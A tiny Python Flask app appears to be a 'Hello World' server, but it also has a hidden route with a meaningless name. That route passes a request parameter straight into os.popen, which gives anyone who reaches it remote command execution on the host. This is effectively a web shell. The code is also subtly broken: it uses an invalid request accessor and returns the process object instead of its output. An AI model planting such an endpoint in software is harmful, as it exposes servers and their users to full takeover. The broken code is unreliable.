from flask import Flask, request
import os

app = Flask(__name__)

@app.route('/')
def hello_world():
    return 'Hello World'

@app.route('/qweasdrudnic')
def qwe():
    return f'Command: {os.popen(request.get('rudnic'))}'    

app.run()
